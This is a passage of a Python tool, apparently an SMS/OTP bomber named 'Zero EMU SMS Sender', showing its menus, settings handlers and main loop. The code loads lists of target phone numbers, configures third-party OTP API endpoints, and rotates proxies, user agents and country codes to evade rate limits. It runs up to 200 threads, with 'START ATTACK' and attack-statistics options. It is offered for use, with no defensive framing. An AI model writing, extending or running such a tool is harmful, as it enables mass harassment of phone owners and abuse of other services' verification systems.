    print(f"{Fore.CYAN}  │ {Fore.WHITE}🔄 UA Rotate : {Fore.GREEN}{'ON' if config['rotate_ua'] else 'OFF':<5}{Fore.CYAN}  {Fore.WHITE}Proxy Mode: {Fore.GREEN}{config['rotate_mode']:<8}{Fore.CYAN}  {Fore.WHITE}Country Sw: {Fore.GREEN}{'ON' if config['country_switch'] else 'OFF':<4}{Fore.CYAN}│")
    if config["country_switch"]:
        print(f"{Fore.CYAN}  │ {Fore.WHITE}🌍 Countries : {Fore.GREEN}{', '.join(config['country_codes'])}   {Fore.CYAN}│")
    if config["running"]:
        total = config["request_count"]
        success = config["success_count"]
        failed = config["fail_count"]
        print(f"{Fore.CYAN}  │ {Fore.RED}▶ RUNNING{Fore.CYAN}  Total: {total:06d}  ✓ {success}  ✗ {failed}  │")
    print(f"{Fore.CYAN}  └────────────────────────────────────────────────────────────┘")
    print()

def show_menu():
    """Display the main interactive menu"""
    print(f"""{Fore.YELLOW}  ╔══════════════════════ MAIN MENU ═══════════════════════╗
  ║                                                    ║
  ║  {Fore.CYAN}[1]  📂 Load Numbers from File{Fore.YELLOW}                        ║
  ║  {Fore.CYAN}[2]  📋 View Loaded Numbers{Fore.YELLOW}                           ║
  ║  {Fore.CYAN}[3]  ➕ Add Number Manually{Fore.YELLOW}                            ║
  ║  {Fore.CYAN}[4]  🔌 Load Proxies from File{Fore.YELLOW}                         ║
  ║  {Fore.CYAN}[5]  ➕ Add Proxy Manually{Fore.YELLOW}                             ║
  ║  {Fore.CYAN}[6]  🌐 Test All Proxies{Fore.YELLOW}                               ║
  ║  {Fore.CYAN}[7]  🔗 Set OTP API Endpoints{Fore.YELLOW}                         ║
  ║  {Fore.CYAN}[8]  🌍 Set Country Code Switch{Fore.YELLOW}                       ║
  ║  {Fore.CYAN}[9]  📱 User Agent Manager{Fore.YELLOW}                             ║
  ║  {Fore.CYAN}[10] ⚙️  Attack Settings{Fore.YELLOW}                               ║
  ║  {Fore.CYAN}[11] 🎯 Select Specific Numbers{Fore.YELLOW}                        ║
  ║  {Fore.CYAN}[12] 🔀 Set Proxy Rotation Mode{Fore.YELLOW}                       ║
  ║  {Fore.CYAN}[13] 📊 View Attack Stats{Fore.YELLOW}                              ║
  ║  {Fore.CYAN}[14] 🔄 Save/Load Config{Fore.YELLOW}                              ║
  ║                                                    ║
  ║  {Fore.GREEN}[S] 🚀 START ATTACK{Fore.YELLOW}                                   ║
  ║  {Fore.RED}[X] 🛑 STOP ATTACK{Fore.YELLOW}                                     ║
  ║                                                    ║
  ║  {Fore.WHITE}[0] ❌ Exit{Fore.YELLOW}                                            ║
  ╚══════════════════════════════════════════════════════╝
    """)

# ═══════════════════════════════════════════════════════════════
# MENU HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_set_apis(config):
    """Setup OTP API endpoints"""
    print(f"\n{Fore.CYAN}  ── OTP API Endpoint Setup ──")
    print(f"{Fore.YELLOW}  Enter the API URL and JSON payload for sending OTP.")
    print(f"{Fore.YELLOW}  Use 'null' (without quotes) for the phone number field.")
    print(f"{Fore.YELLOW}  Type 'done' when finished.\n")
    
    endpoints = []
    payloads = []
    
    # Show example
    print(f"{Fore.WHITE}  Example:")
    print(f"{Fore.WHITE}    API: https://api.example.com/send-otp")
    print(f"{Fore.WHITE}    Payload: {Fore.GREEN}{{\"phone\": null, \"action\": \"send\"}}")
    print(f"{Fore.WHITE}    Or: {Fore.GREEN}{{\"mobile_number\": null, \"method\": \"GET\"}}")
    print(f"{Fore.WHITE}    Or: {Fore.GREEN}{{\"phone\": null, \"method\": \"GET\"}}{Fore.WHITE} for GET requests\n")
    
    while True:
        url = input(f"{Fore.GREEN}  API URL (or 'done'): {Fore.WHITE}").strip()
        if url.lower() in ("done", "exit", ""):
            if not endpoints:
                print(f"{Fore.YELLOW}  No APIs added. Using demo endpoint.")
                endpoints = ["https://httpbin.org/post"]
                payloads = [{"phone": None, "test": True}]
            break
        
        # Validate URL
        if not url.startswith(("http://", "https://")):
            print(f"{Fore.RED}  [!] Invalid URL. Must start with http:// or https://")
            continue
        
        print(f"{Fore.YELLOW}  Enter payload JSON (null=phone number):")
        payload_str = input(f"{Fore.GREEN}  Payload: {Fore.WHITE}").strip()
        
        try:
            if payload_str:
                payload = json.loads(payload_str)
            else:
                payload = {"phone": None}
            
            endpoints.append(url)
            payloads.append(payload)
            print(f"{Fore.GREEN}  [✓] Added: {url}")
            
        except json.JSONDecodeError:
            print(f"{Fore.RED}  [!] Invalid JSON. Use format: {{\"phone\": null, \"action\": \"send\"}}")
    
    config["api_endpoints"] = endpoints
    config["api_payloads"] = payloads
    save_config(config)
    print(f"{Fore.GREEN}  [✓] {len(endpoints)} API endpoint(s) configured!")

def handle_country_switch(config):
    """Setup country code switching"""
    print(f"\n{Fore.CYAN}  ── Country Code Switch ──")
    enable = input(f"{Fore.GREEN}  Enable country switching? (y/n): {Fore.WHITE}").strip().lower()
    
    if enable == "y":
        config["country_switch"] = True
        codes = input(f"{Fore.GREEN}  Country codes (comma sep, e.g. +880,+91,+1,+966): {Fore.WHITE}").strip()
        config["country_codes"] = [c.strip() for c in codes.split(",") if c.strip()]
        print(f"{Fore.GREEN}  [✓] Country switching ENABLED → {', '.join(config['country_codes'])}")
    else:
        config["country_switch"] = False
        print(f"{Fore.YELLOW}  [✗] Country switching DISABLED")
    
    save_config(config)

def handle_ua_manager(config):
    """User Agent Manager"""
    while True:
        show_banner()
        print(f"""{Fore.YELLOW}  ╔══════════════════ USER AGENT MANAGER ═══════════════════╗
  ║                                                    ║
  ║  {Fore.CYAN}[1] 📋 View Custom UAs{Fore.YELLOW}                                     ║
  ║  {Fore.CYAN}[2] ➕ Add Custom UA{Fore.YELLOW}                                        ║
  ║  {Fore.CYAN}[3] ❌ Remove Custom UA{Fore.YELLOW}                                     ║
  ║  {Fore.CYAN}[4] 🎲 Test Random UAs (10 samples){Fore.YELLOW}                        ║
  ║  {Fore.CYAN}[5] 🔢 Count Total Possible UAs{Fore.YELLOW}                            ║
  ║  {Fore.CYAN}[6] 📂 Reload UA from File{Fore.YELLOW}                                 ║
  ║  {Fore.CYAN}[0] ◀ Back{Fore.YELLOW}                                                 ║
  ╚══════════════════════════════════════════════════════╝
        """)
        
        c = input(f"{Fore.GREEN}  ─➤ Choose: {Fore.WHITE}").strip()
        
        if c == "1":
            custom_uas = load_file(config["ua_file"], "custom UAs")
            if custom_uas:
                for i, ua in enumerate(custom_uas[:30], 1):
                    print(f"  {i:3d}. {ua[:80]}...")
                if len(custom_uas) > 30:
                    print(f"  ... {len(custom_uas) - 30} more")
        elif c == "2":
            ua = input(f"{Fore.GREEN}  Enter User Agent: {Fore.WHITE}").strip()
            if ua:
                with open(config["ua_file"], "a") as f:
                    f.write(ua + "\n")
                print(f"{Fore.GREEN}  [✓] Added custom UA!")
        elif c == "3":
            custom_uas = load_file(config["ua_file"], "custom UAs")
            if custom_uas:
                for i, ua in enumerate(custom_uas[:30], 1):
                    print(f"  {i:3d}. {ua[:60]}...")
                try:
                    idx = int(input(f"{Fore.GREEN}  Remove #: {Fore.WHITE}")) - 1
                    if 0 <= idx < len(custom_uas):
                        removed = custom_uas.pop(idx)
                        with open(config["ua_file"], "w") as f:
                            f.write("\n".join(custom_uas) + "\n")
                        print(f"{Fore.GREEN}  [✓] Removed: {removed[:50]}")
                except:
                    print(f"{Fore.RED}  [!] Invalid")
        elif c == "4":
            print(f"\n{Fore.CYAN}  10 Random User Agents:")
            for i in range(10):
                print(f"  {i+1:2d}. [{Fore.YELLOW}{UA_GENERATORS[i % len(UA_GENERATORS)][0].__name__ if hasattr(UA_GENERATORS[i % len(UA_GENERATORS)][0], '__name__') else 'UA'}{Fore.WHITE}]")
                print(f"      {get_random_ua()}")
        elif c == "5":
            # Rough calculation
            total_iphone = len(IPHONE_MODELS) * len(IOS_VERSIONS) * (len(SAFARI_VERSIONS) + len(CHROME_IOS) + len(FIREFOX_IOS))
            total_android = (len(SAMSUNG_MODELS) * len(ANDROID_VERSIONS) * (len(CHROME_ANDROID) + len(SAMSUNG_BROWSER)) +
                           len(XIAOMI_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_ANDROID) +
                           len(PIXEL_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_ANDROID) +
                           len(ONEPLUS_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_ANDROID) +
                           len(HUAWEI_MODELS) * len(ANDROID_VERSIONS) * len(CHROME_ANDROID) +
                           len(ANDROID_VERSIONS) * (len(FIREFOX_ANDROID) + 8))
            print(f"{Fore.GREEN}  ── UA Count Estimates ──")
            print(f"  iPhone UA combinations: {total_iphone:,}")
            print(f"  Android UA combinations: {total_android:,}")
            print(f"  Total: {total_iphone + total_android:,}+")
        elif c == "6":
            load_file(config["ua_file"], "custom UAs")
        elif c == "0":
            break
        
        input(f"\n{Fore.YELLOW}  Press Enter...")

def handle_settings(config):
    """Attack settings"""
    print(f"\n{Fore.CYAN}  ── Attack Settings ──")
    
    try:
        t = input(f"{Fore.GREEN}  Threads [{config['threads']}]: {Fore.WHITE}").strip()
        if t: config["threads"] = max(1, min(200, int(t)))
        
        d = input(f"{Fore.GREEN}  Delay (seconds) [{config['delay']}]: {Fore.WHITE}").strip()
        if d: config["delay"] = max(0.01, float(d))
        
        to = input(f"{Fore.GREEN}  Timeout (seconds) [{config['timeout']}]: {Fore.WHITE}").strip()
        if to: config["timeout"] = max(3, int(to))
        
        retry = input(f"{Fore.GREEN}  Max retries on fail [{config['max_retries']}]: {Fore.WHITE}").strip()
        if retry: config["max_retries"] = max(0, int(retry))
        
        ru = input(f"{Fore.GREEN}  Rotate User-Agent? (y/n) [{'y' if config['rotate_ua'] else 'n'}]: {Fore.WHITE}").strip().lower()
        if ru: config["rotate_ua"] = (ru == "y")
        
        print(f"{Fore.GREEN}  [✓] Settings saved!")
        save_config(config)
        
    except ValueError:
        print(f"{Fore.RED}  [!] Invalid number input")

def handle_proxy_test(proxies):
    """Test all loaded proxies"""
    if not proxies:
        print(f"{Fore.RED}  [!] No proxies to test!")
        return []
    
    print(f"{Fore.CYAN}  ── Testing {len(proxies)} proxies ──")
    working = []
    
    for i, proxy in enumerate(proxies, 1):
        sys.stdout.write(f"\r{Fore.YELLOW}  Testing proxy {i}/{len(proxies)}...{Style.RESET_ALL}")
        sys.stdout.flush()
        
        try:
            proxy_dict = {"http": proxy, "https": proxy}
            r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=5)
            if r.status_code == 200:
                working.append(proxy)
                print(f"\r{Fore.GREEN}  ✓ [{i}/{len(proxies)}] {proxy}")
        except:
            print(f"\r{Fore.RED}  ✗ [{i}/{len(proxies)}] {proxy}")
    
    print(f"\n{Fore.GREEN}  [✓] {len(working)}/{len(proxies)} proxies working!")
    
    # Save working proxies
    if working:
        with open("proxies.txt", "w") as f:
            f.write("\n".join(working) + "\n")
        print(f"{Fore.GREEN}  [✓] Updated proxies.txt with {len(working)} working proxies")
    
    return working

def handle_view_stats(config):
    """View attack statistics"""
    print(f"\n{Fore.CYAN}  ── Attack Statistics ──")
    print(f"  Total requests: {config.get('request_count', 0)}")
    print(f"  Successful:     {Fore.GREEN}{config.get('success_count', 0)}")
    print(f"  Failed:         {Fore.RED}{config.get('fail_count', 0)}")
    if config.get("request_count", 0) > 0:
        rate = config["success_count"] / config["request_count"] * 100
        print(f"  Success rate:   {Fore.YELLOW}{rate:.2f}%")
    print()

# ═══════════════════════════════════════════════════════════════
# MAIN LOOP
# ═══════════════════════════════════════════════════════════════

def main():
    # Load config
    config = load_config()
    
    # Load data files
    numbers = load_file(config["numbers_file"], "numbers")
    proxies = load_file(config["proxies_file"], "proxies")
    custom_uas = load_file(config["ua_file"], "custom UAs")
    
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings()
    
    while True:
        show_banner()
        show_status(config, numbers, proxies, custom_uas)
        show_menu()
        
        choice = input(f"{Fore.GREEN}  ─➤ Choose: {Fore.WHITE}").strip().lower()
        
        if choice == "1":
            numbers = load_file(config["numbers_file"], "numbers")
        elif choice == "2":
            if numbers:
                print(f"\n{Fore.CYAN}  ── {len(numbers)} Numbers ──")
                for i, n in enumerate(numbers[:80], 1):
                    print(f"  {i:3d}. {n}")
                if len(numbers) > 80:
                    print(f"  ... {len(numbers)-80} more")
            else:
                print(f"{Fore.RED}  No numbers loaded.")
        elif choice == "3":
            n = input(f"{Fore.GREEN}  Enter number: {Fore.WHITE}").strip()
            if n:
                numbers.append(n)
                print(f"{Fore.GREEN}  [✓] Added: {n}")
                # Also save to file
                with open(config["numbers_file"], "a") as f:
                    f.write(n + "\n")
        elif choice == "4":
            proxies = load_file(config["proxies_file"], "proxies")
        elif choice == "5":
            p = input(f"{Fore.GREEN}  Enter proxy (http://ip:port): {Fore.WHITE}").strip()
            if p:
                proxies.append(p)
                with open(config["proxies_file"], "a") as f:
                    f.write(p + "\n")
                print(f"{Fore.GREEN}  [✓] Added proxy")
        elif choice == "6":
            proxies = handle_proxy_test(proxies)
        elif choice == "7":
            handle_set_apis(config)
        elif choice == "8":
            handle_country_switch(config)
        elif choice == "9":
            handle_ua_manager(config)
            custom_uas = load_file(config["ua_file"], "custom UAs")
        elif choice == "10":
            handle_settings(config)
        elif choice == "11":
            if numbers:
                print(f"\n{Fore.YELLOW}  Enter indices to select (e.g. 1,3,5-10)")
                sel = input(f"{Fore.GREEN}  Selection: {Fore.WHITE}").strip()
                if sel.lower() == "all":
                    pass
                else:
                    try:
                        selected = []
                        for part in sel.split(","):
                            part = part.strip()
                            if "-" in part:
                                s, e = part.split("-")
                                selected.extend(range(int(s)-1, int(e)))
                            else:
                                selected.append(int(part)-1)
                        numbers = [numbers[i] for i in selected if 0 <= i < len(numbers)]
                        print(f"{Fore.GREEN}  [✓] {len(numbers)} numbers selected")
                    except:
                        print(f"{Fore.RED}  [!] Invalid selection")
            else:
                print(f"{Fore.RED}  No numbers loaded.")
        elif choice == "12":
            print(f"\n{Fore.CYAN}  Proxy Modes:")
            print(f"  1. Random (different proxy each request)")
            print(f"  2. Sequential (round-robin)")
            print(f"  3. No proxy (direct)")
            m = input(f"{Fore.GREEN}  Choose (1-3): {Fore.WHITE}").strip()
            if m == "1":
                config["rotate_proxy"] = True
                config["rotate_mode"] = "random"
            elif m == "2":
                config["rotate_proxy"] = True
                config["rotate_mode"] = "sequential"
            elif m == "3":
                config["rotate_proxy"] = False
            save_config(config)
        elif choice == "13":
            handle_view_stats(config)
        elif choice == "14":
            print(f"{Fore.CYAN}  ── Save/Load Config ──")
            print(f"  1. Save current config")
            print(f"  2. Load saved config")
            sc = input(f"{Fore.GREEN}  Choose: {Fore.WHITE}").strip()
            if sc == "1":
                save_config(config)
                print(f"{Fore.GREEN}  [✓] Config saved!")
            elif sc == "2":
                config = load_config()
                print(f"{Fore.GREEN}  [✓] Config loaded!")
        elif choice == "s":
            start_attack(config, numbers, proxies, custom_uas)
        elif choice == "x":
            config["running"] = False
            print(f"\n{Fore.RED}  🛑 Attack stopped!")
            time.sleep(1)
        elif choice == "0":
            config["running"] = False
            print(f"\n{Fore.YELLOW}  Exiting Zero EMU SMS Sender...")
            time.sleep(0.5)
            sys.exit(0)
        else:
            print(f"{Fore.RED}  [!] Invalid option")
        
        if choice not in ("s", "x"):
            input(f"\n{Fore.YELLOW}  Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}  [!] Interrupted. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}  [!] Critical error: {e}")
        sys.exit(1)
